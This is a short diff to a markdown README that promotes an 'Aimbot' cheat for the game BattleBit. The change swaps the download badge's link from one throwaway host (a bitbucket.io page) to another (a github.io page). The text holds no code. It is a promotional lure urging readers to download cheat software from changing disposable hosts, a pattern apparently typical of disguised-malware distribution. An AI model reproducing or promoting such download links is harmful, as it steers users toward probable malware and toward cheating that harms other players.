@@ -6,7 +6,7 @@ BattleBit isn’t just chaos in voxels — it’s one of the most tactical low-p
 
 No more shaky aim or spraying like a bot. Just lock on and watch the killfeed light up.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload15.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://BattleBit-Aimbot-buba8.github.io/.github)
 ---
 
 ## 🎯 What Is BattleBit Aimbot?
